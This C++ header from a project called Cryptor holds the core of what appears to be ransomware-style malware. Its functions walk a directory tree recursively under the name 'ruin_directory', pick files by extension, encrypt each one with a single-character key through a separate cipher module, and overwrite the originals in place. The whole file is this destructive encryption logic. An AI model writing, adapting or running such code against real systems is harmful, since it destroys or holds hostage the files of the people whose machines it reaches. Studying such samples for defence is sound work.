//
//  cryptor.h
//  Cryptor
//
//  Created by MshRoom2290 on 10/23/25.
//

#ifndef CRYPTOR_H
#define CRYPTOR_H

#include <fstream>
#include <filesystem>
#include <iostream>
#include <string>
#include <vector>
#include "banners.h"
#include "cipher.h"
#include "config.h"

namespace cryptor {
    
namespace fs = std::filesystem;

// Function to identify certain file extensions
bool isExtensionValid(const std::vector<std::string>& extensions, const std::string& file_path) {
    std::string ext = fs::path(file_path).extension().string();

    for (const auto& valid_ext : extensions) {
        if (ext == valid_ext) {
            return true;
        }
    }
    return false;
}

// Function to encrypt a singular file
void encrypt_file(const fs::path& file_path, char key) {
    // Check if the file extension is valid
    if (!isExtensionValid(validExtensions, file_path.string())) {
        // Skip files with invalid extensions
        return;
    }

    /* Open the current target file in binary mode */
    std::ifstream input_file(file_path, std::ios::binary);
    if (!input_file) {
        banners::print_error({"Failed to open file for reading", file_path});
        return; // Don't exit; just skip
    }

    /* Read all of the file into a string */
    std::string buff((std::istreambuf_iterator<char>(input_file)),
                      std::istreambuf_iterator<char>());
    input_file.close();

    /* Encrypt the file data directly */
    cipher::msh_cipher(buff, key);

    /* Write back the encrypted data into the same file */
    std::ofstream output_file(file_path, std::ios::binary);
    if (!output_file) {
        banners::print_error({"Failed to open file for writing", file_path});
        return;
    }
    output_file.write(buff.c_str(), buff.size());
    output_file.close();
}

// Function to recursively recurse through the defined directory
void ruin_directory(const fs::path& directory, char key) {
    // Traverse the directory using recursive_directory_iterator (for sub-directories)
    for(const auto& entry : fs::recursive_directory_iterator(directory)) {
        if (entry.is_regular_file()) {
            encrypt_file(entry.path(), key);
        }
    }
}
    
};

#endif
